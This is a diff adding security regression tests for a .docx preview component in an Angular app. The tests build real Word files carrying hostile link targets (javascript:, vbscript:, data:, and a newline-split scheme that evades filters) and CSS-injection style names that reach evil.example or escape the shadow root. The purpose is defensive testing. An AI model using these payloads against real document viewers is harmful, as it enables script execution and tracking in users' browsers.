@@ -3,7 +3,7 @@ import { Component } from '@angular/core';
 import { By } from '@angular/platform-browser';
 
 import { ACCEPTED_EXTENSIONS, previewKindFor, mimeTypeFor } from '../../utils/file-types';
-import { FilePreviewComponent } from './file-preview.component';
+import { FilePreviewComponent, sanitizePreviewCss } from './file-preview.component';
 import { DragNDropComponent } from './drag-n-drop.component';
 import { AttachmentUploadService } from '../../../core/services/attachment-upload.service';
 import { Observable } from 'rxjs';
@@ -43,6 +43,277 @@ function blobUrlStub(): { urls: string[]; restore: () => void } {
   };
 }
 
+const CRC32_TABLE = (() => {
+  const table = new Uint32Array(256);
+  for (let index = 0; index < 256; index += 1) {
+    let value = index;
+    for (let bit = 0; bit < 8; bit += 1) {
+      value = value & 1 ? 0xedb88320 ^ (value >>> 1) : value >>> 1;
+    }
+    table[index] = value >>> 0;
+  }
+  return table;
+})();
+
+function crc32(bytes: Uint8Array): number {
+  let crc = 0xffffffff;
+  for (const byte of bytes) {
+    crc = CRC32_TABLE[(crc ^ byte) & 0xff] ^ (crc >>> 8);
+  }
+  return (crc ^ 0xffffffff) >>> 0;
+}
+
+function concatBytes(parts: readonly Uint8Array[]): Uint8Array<ArrayBuffer> {
+  const total = parts.reduce((sum, part) => sum + part.length, 0);
+  const result = new Uint8Array(total);
+  let offset = 0;
+  for (const part of parts) {
+    result.set(part, offset);
+    offset += part.length;
+  }
+  return result;
+}
+
+function uint16(value: number): Uint8Array {
+  return new Uint8Array([value & 0xff, (value >>> 8) & 0xff]);
+}
+
+function uint32(value: number): Uint8Array {
+  return new Uint8Array([
+    value & 0xff,
+    (value >>> 8) & 0xff,
+    (value >>> 16) & 0xff,
+    (value >>> 24) & 0xff
+  ]);
+}
+
+/** A ZIP with stored (uncompressed) entries — an archive shape every reader accepts. */
+function storedZip(entries: readonly { name: string; text: string }[]): Uint8Array<ArrayBuffer> {
+  const encoder = new TextEncoder();
+  const local: Uint8Array[] = [];
+  const central: Uint8Array[] = [];
+  let offset = 0;
+
+  for (const entry of entries) {
+    const name = encoder.encode(entry.name);
+    const data = encoder.encode(entry.text);
+    const crc = crc32(data);
+    const header = concatBytes([
+      uint32(0x04034b50),
+      uint16(20),
+      uint16(0),
+      uint16(0),
+      uint16(0),
+      uint16(0),
+      uint32(crc),
+      uint32(data.length),
+      uint32(data.length),
+      uint16(name.length),
+      uint16(0),
+      name,
+      data
+    ]);
+    local.push(header);
+    central.push(
+      concatBytes([
+        uint32(0x02014b50),
+        uint16(20),
+        uint16(20),
+        uint16(0),
+        uint16(0),
+        uint16(0),
+        uint16(0),
+        uint32(crc),
+        uint32(data.length),
+        uint32(data.length),
+        uint16(name.length),
+        uint16(0),
+        uint16(0),
+        uint16(0),
+        uint16(0),
+        uint32(0),
+        uint32(offset),
+        name
+      ])
+    );
+    offset += header.length;
+  }
+
+  const directory = concatBytes(central);
+  return concatBytes([
+    ...local,
+    directory,
+    concatBytes([
+      uint32(0x06054b50),
+      uint16(0),
+      uint16(0),
+      uint16(entries.length),
+      uint16(entries.length),
+      uint32(directory.length),
+      uint32(offset),
+      uint16(0)
+    ])
+  ]);
+}
+
+const W_NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
+const R_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
+const REL_NS = 'http://schemas.openxmlformats.org/package/2006/relationships';
+
+function makeDocxFile(name: string, files: { name: string; text: string }[]): File {
+  return new File([storedZip(files)], name, {
+    type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+  });
+}
+
+/**
+ * A real `.docx` carrying two links whose targets the *document* picks, plus one named style.
+ *
+ * The hostile target is the shape the security review demonstrated: the renderer copies a
+ * relationship's `Target` straight into `href`, so the file — which arrived from outside the
+ * organisation — decides what a click in the preview does.
+ */
+function docxWithLinks(hostileTarget: string): File {
+  const xml = (body: string): string =>
+    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n${body}`;
+
+  return makeDocxFile('бриф.docx', [
+    {
+      name: '[Content_Types].xml',
+      text: xml(
+        `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">` +
+          `<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>` +
+          `<Default Extension="xml" ContentType="application/xml"/>` +
+          `<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>` +
+          `<Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>` +
+          `</Types>`
+      )
+    },
+    {
+      name: '_rels/.rels',
+      text: xml(
+        `<Relationships xmlns="${REL_NS}">` +
+          `<Relationship Id="rId1" Type="${R_NS}/officeDocument" Target="word/document.xml"/>` +
+          `</Relationships>`
+      )
+    },
+    {
+      name: 'word/document.xml',
+      text: xml(
+        `<w:document xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:body>` +
+          `<w:p><w:r><w:t>Пояснительная записка</w:t></w:r></w:p>` +
+          `<w:p><w:hyperlink r:id="rIdHostile"><w:r><w:t>злая ссылка</w:t></w:r></w:hyperlink></w:p>` +
+          `<w:p><w:hyperlink r:id="rIdSafe"><w:r><w:t>добрая ссылка</w:t></w:r></w:hyperlink></w:p>` +
+          `</w:body></w:document>`
+      )
+    },
+    {
+      name: 'word/_rels/document.xml.rels',
+      text: xml(
+        `<Relationships xmlns="${REL_NS}">` +
+          `<Relationship Id="rIdHostile" Type="${R_NS}/hyperlink" Target="${hostileTarget}" TargetMode="External"/>` +
+          `<Relationship Id="rIdSafe" Type="${R_NS}/hyperlink" Target="https://minobrnauki.gov.ru/" TargetMode="External"/>` +
+          `<Relationship Id="rIdStyles" Type="${R_NS}/styles" Target="styles.xml"/>` +
+          `</Relationships>`
+      )
+    },
+    {
+      name: 'word/styles.xml',
+      text: xml(
+        `<w:styles xmlns:w="${W_NS}"><w:docDefaults><w:rPrDefault><w:rPr>` +
+          `<w:rFonts w:ascii="Arial"/></w:rPr></w:rPrDefault></w:docDefaults>` +
+          `<w:style w:type="paragraph" w:default="1" w:styleId="Normal"><w:name w:val="Normal"/></w:style>` +
+          `</w:styles>`
+      )
+    }
+  ]);
+}
+
+/**
+ * A real `.docx` whose style and font names leave the rule they were written into.
+ *
+ * The renderer interpolates both into the generated CSS unescaped, so a crafted name closes
+ * its declaration and opens one of its own. Each value below is one of the three openings
+ * the security review demonstrated: a `:host` rule that restyles the preview's own container
+ * from behind the shadow boundary, an `@import` that makes the browser fetch a stylesheet,
+ * and a `url()` inside a synthesised rule that makes it fetch an image instead.
+ */
+function docxWithHostileStyles(): File {
+  const xml = (body: string): string =>
+    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n${body}`;
+
+  return makeDocxFile('злой.docx', [
+    {
+      name: '[Content_Types].xml',
+      text: xml(
+        `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">` +
+          `<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>` +
+          `<Default Extension="xml" ContentType="application/xml"/>` +
+          `<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>` +
+          `<Override PartName="/word/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml"/>` +
+          `</Types>`
+      )
+    },
+    {
+      name: '_rels/.rels',
+      text: xml(
+        `<Relationships xmlns="${REL_NS}">` +
+          `<Relationship Id="rId1" Type="${R_NS}/officeDocument" Target="word/document.xml"/>` +
+          `</Relationships>`
+      )
+    },
+    {
+      name: 'word/document.xml',
+      text: xml(
+        `<w:document xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:body>` +
+          `<w:p><w:r><w:t>Пояснительная записка</w:t></w:r></w:p>` +
+          `</w:body></w:document>`
+      )
+    },
+    {
+      name: 'word/_rels/document.xml.rels',
+      text: xml(
+        `<Relationships xmlns="${REL_NS}">` +
+          `<Relationship Id="rIdStyles" Type="${R_NS}/styles" Target="styles.xml"/>` +
+          `</Relationships>`
+      )
+    },
+    {
+      name: 'word/styles.xml',
+      text: xml(
+        `<w:styles xmlns:w="${W_NS}"><w:docDefaults><w:rPrDefault><w:rPr>` +
+          `<w:rFonts w:ascii="Evil';}@import url(https://evil.example/font.css);p{color:red"/>` +
+          `</w:rPr></w:rPrDefault></w:docDefaults>` +
+          `<w:style w:type="paragraph" w:default="1" w:styleId="Normal"><w:name w:val="Normal"/></w:style>` +
+          `<w:style w:type="paragraph" w:styleId="Злой{}:host{position:fixed;inset:0;z-index:99999}">` +
+          `<w:name w:val="Злой"/><w:rPr>` +
+          `<w:shd w:val="clear" w:fill="url(https://evil.example/pixel.png)}p{background:url(https://evil.example/tracker.png)"/>` +
+          `</w:rPr></w:style>` +
+          `</w:styles>`
+      )
+    }
+  ]);
+}
+
+/** The container the preview rendered into, and the shadow tree it confined the render to. */
+function docxRender(fixture: ComponentFixture<FilePreviewComponent>): {
+  container: HTMLElement;
+  root: ShadowRoot;
+} {
+  const container = fixture.nativeElement.querySelector(
+    '.file-preview__docx'
+  ) as HTMLElement | null;
+  const root = container?.shadowRoot ?? null;
+  if (!container || !root) {
+    throw new Error('the docx preview did not render into a shadow root');
+  }
+  return { container, root };
+}
+
+function docxLinks(fixture: ComponentFixture<FilePreviewComponent>): HTMLAnchorElement[] {
+  return Array.from(docxRender(fixture).root.querySelectorAll('a')) as HTMLAnchorElement[];
+}
+
 describe('previewKindFor', () => {
   it('maps browser-viewable formats to their renderers', () => {
     expect(previewKindFor('.pdf')).toBe('pdf');
@@ -71,6 +342,29 @@ describe('previewKindFor', () => {
   });
 });
 
+describe('sanitizePreviewCss', () => {
+  it('removes the rules that reach the network or the host, and keeps the document’s own', () => {
+    const hostile = [
+      '.docx_злой{}:host{position:fixed;inset:0;z-index:99999}',
+      "@import url('https://evil.example/x.css');",
+      'p.docx_злой{background:url(https://evil.example/tracker.png);}',
+      '@font-face{font-family:X;src:url(https://evil.example/f.woff)}',
+      '.docx p { margin: 0pt; }',
+      '@font-face{font-family:Y;src:url(data:font/woff2;base64,AAAA)}'
+    ].join('\n');
+
+    const safe = sanitizePreviewCss(hostile);
+
+    expect(safe).not.toContain('@import');
+    expect(safe).not.toContain(':host');
+    expect(safe).not.toContain('evil.example');
+    // An embedded font is a data URL: there is nothing to fetch, and dropping it would leave
+    // the document in the wrong typeface.
+    expect(safe).toContain('url(data:font/woff2;base64,AAAA)');
+    expect(safe).toContain('.docx p { margin: 0pt; }');
+  });
+});
+
 describe('FilePreviewComponent', () => {
   const compile = (file: File) => {
     const fixture = TestBed.createComponent(FilePreviewComponent);
@@ -90,6 +384,81 @@ describe('FilePreviewComponent', () => {
     expect(fixture.nativeElement.querySelector('.file-preview__warning')).not.toBeNull();
     expect(fixture.nativeElement.querySelector('[role="alert"]')).not.toBeNull();
     expect(fixture.nativeElement.textContent).toContain('Не удалось открыть предпросмотр');
+  });
+
+  it.each([
+    ['javascript:', 'javascript:window.__docxPwned=true'],
+    ['mixed-case javascript:', 'JaVaScRiPt:window.__docxPwned=true'],
+    // A character reference, because a *literal* newline in an attribute is normalised to a
+    // space by the XML parser and stops being a scheme at all. This one survives to the DOM,
+    // where the URL parser strips it again and the scheme is `javascript:` after all.
+    ['javascript: split by a newline', 'java&#10;script:window.__docxPwned=true'],
+    ['vbscript:', 'vbscript:msgbox(1)'],
+    ['data:', 'data:text/plain,__docxPwned']
+  ])('drops the href of a link a document points at %s', async (_label, target) => {
+    const fixture = compile(docxWithLinks(target));
+    await waitForPhase(fixture, 'ready');
+
+    const links = docxLinks(fixture);
+    // Non-vacuous: the document really did render both of its links.
+    expect(links.map((link) => link.textContent)).toEqual(['злая ссылка', 'добрая ссылка']);
+
+    const hostile = links[0];
+    expect(hostile.hasAttribute('href')).toBe(false);
+    expect(hostile.outerHTML).not.toContain('__docxPwned');
+  });
+
+  it('keeps a real link, hardened, and confines the document stylesheet to its own tree', async () => {
+    const fixture = compile(docxWithLinks('javascript:window.__docxPwned=true'));
+    await waitForPhase(fixture, 'ready');
+
+    const { container, root } = docxRender(fixture);
+    const safe = docxLinks(fixture)[1];
+    expect(safe.getAttribute('href')).toBe('https://minobrnauki.gov.ru/');
+    expect(safe.getAttribute('rel')).toBe('noopener noreferrer');
+    expect(safe.getAttribute('target')).toBe('_blank');
+
+    // The renderer assembles a stylesheet from the document's own style and font names,
+    // unescaped. It belongs in the shadow tree, where no rule can reach the app around it.
+    expect(root.querySelector('style')).not.toBeNull();
+    expect(container.querySelector('style')).toBeNull();
+
+    // A relative target resolves against the app's own origin and is allowed through.
+    const relative = docxWithLinks('#anchor');
+    const relativeFixture = compile(relative);
+    await waitForPhase(relativeFixture, 'ready');
+    const bookmark = docxLinks(relativeFixture)[0];
+    expect(bookmark.getAttribute('href')).toBe('#anchor');
+    // A bookmark is a place in this document, not an address: leaving it in the current
+    // context is what keeps a table of contents inside the preview instead of opening the
+    // app in a second tab.
+    expect(bookmark.getAttribute('target')).toBeNull();
+  });
+
+  it('keeps the document stylesheet in the shadow tree and out of the network', async () => {
+    const fixture = compile(docxWithHostileStyles());
+    await waitForPhase(fixture, 'ready');
+
+    const { container, root } = docxRender(fixture);
+    const styles = Array.from(root.querySelectorAll('style'));
+    // Non-vacuous: this document really did make the renderer synthesise a stylesheet.
+    expect(styles.length).toBeGreaterThan(0);
+
+    const inside = styles.map((style) => style.textContent ?? '').join('\n');
+    // The document's own styling is still there; only the escapes are gone.
+    expect(inside).toContain('.docx {');
+    expect(inside).not.toContain('@import');
+    expect(inside).not.toContain(':host');
+    expect(inside).not.toContain('evil.example');
+
+    // Nothing the document generated left the shadow tree: not into the component's own
+    // markup, and not into the page, where a stylesheet would be applied to the whole app
+    // and an `@import` or `url()` would be fetched the moment it landed.
+    expect(container.querySelector('style')).toBeNull();
+    const escaped = Array.from(document.querySelectorAll('style')).filter(
+      (style) => !root.contains(style) && (style.textContent ?? '').includes('evil.example')
+    );
+    expect(escaped).toEqual([]);
   });
 
   it('renders a spreadsheet with sheet tabs and a single table', async () => {
